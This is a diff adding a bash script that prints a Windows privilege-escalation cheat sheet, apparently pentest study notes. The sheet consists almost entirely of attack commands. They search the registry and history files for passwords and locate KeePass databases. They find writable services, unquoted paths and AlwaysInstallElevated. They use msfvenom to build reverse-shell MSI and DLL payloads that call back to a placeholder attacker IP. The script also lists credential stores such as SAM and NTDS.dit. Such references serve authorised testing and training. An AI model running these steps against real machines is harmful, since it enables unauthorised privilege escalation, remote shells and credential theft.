@@ -1,0 +1,72 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── PRIVILEGE ESCALATION — WINDOWS ───────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Enumeration ──────────────────────────────────────${NC}"
+echo -e "  ${GREEN}whoami; whoami /groups; whoami /privs${NC}"
+echo -e "  ${GREEN}hostname; systeminfo; ipconfig /all; route print; netstat -ano${NC}"
+echo -e "  ${GREEN}net user; Get-LocalUser; Get-LocalGroup; Get-LocalGroupMember Administrators${NC}"
+echo -e "  ${GREEN}Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | select displayname${NC}"
+echo -e "  ${GREEN}Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue${NC}"
+echo -e "  ${GREEN}Get-History; (Get-PSReadlineOption).HistorySavePath${NC}"
+echo -e "  ${GREEN}reg query HKLM /f password /t REG_SZ /s${NC}"
+echo -e "  ${GREEN}reg query HKCU /f password /t REG_SZ /s${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Automated Tools ──────────────────────────────────${NC}"
+echo -e "  ${GREEN}.\\winPEAS.exe${NC}"
+echo -e "  ${GREEN}.\\Seatbelt.exe -group=all${NC}"
+echo -e "  ${GREEN}. .\\PowerUp.ps1; Invoke-AllChecks${NC}"
+echo -e "  ${GREEN}.\\SharpUp.exe audit${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Binary Hijacking / Writable Service ──────────────${NC}"
+echo -e "  ${GREEN}Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {\$_.State -like 'Running'}${NC}"
+echo -e "  ${GREEN}icacls <exe_path>${NC}"
+echo -e "  ${GREEN}. .\\PowerUp.ps1; Get-ModifiableServiceFile${NC}"
+echo -e "  ${GREEN}sc.exe stop <servicename> && sc.exe start <servicename>${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Unquoted Service Path ────────────────────────────${NC}"
+echo -e "  ${GREEN}wmic service get name,pathname | findstr /i /v 'C:\\Windows\\\\' | findstr /i /v '\"'${NC}"
+echo -e "  ${GREEN}. .\\PowerUp.ps1; Get-UnquotedService${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Scheduled Tasks ──────────────────────────────────${NC}"
+echo -e "  ${GREEN}schtasks /query /fo LIST /v${NC}"
+echo -e "  ${GREEN}icacls <task_binary_path>${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── AlwaysInstallElevated ────────────────────────────${NC}"
+echo -e "  ${GREEN}reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated${NC}"
+echo -e "  ${GREEN}reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated${NC}"
+echo -e "  ${GREEN}msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f msi -o evil.msi${NC}"
+echo -e "  ${GREEN}msiexec /quiet /qn /i evil.msi${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── DLL Search Order Hijacking ───────────────────────${NC}"
+echo -e "  Note: Use ProcMon to find DLL not found errors for running service"
+echo -e "  ${GREEN}msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll -o missing.dll${NC}"
+echo -e "  Note: Copy to writable path that's searched first"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Juicy File Locations ─────────────────────────────${NC}"
+echo -e "  ${BLUE}C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\${NC}"
+echo -e "  ${BLUE}C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Protect\\${NC}"
+echo -e "  ${BLUE}C:\\Windows\\System32\\config\\${NC}                       # SAM, SYSTEM, SECURITY"
+echo -e "  ${BLUE}C:\\Windows\\NTDS\\ntds.dit${NC}"
+echo -e "  ${BLUE}%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt${NC}"
+echo -e "  ${BLUE}C:\\inetpub\\wwwroot\\web.config${NC}"
+echo -e "  ${BLUE}HKLM\\Software\\TightVNC\\Server${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
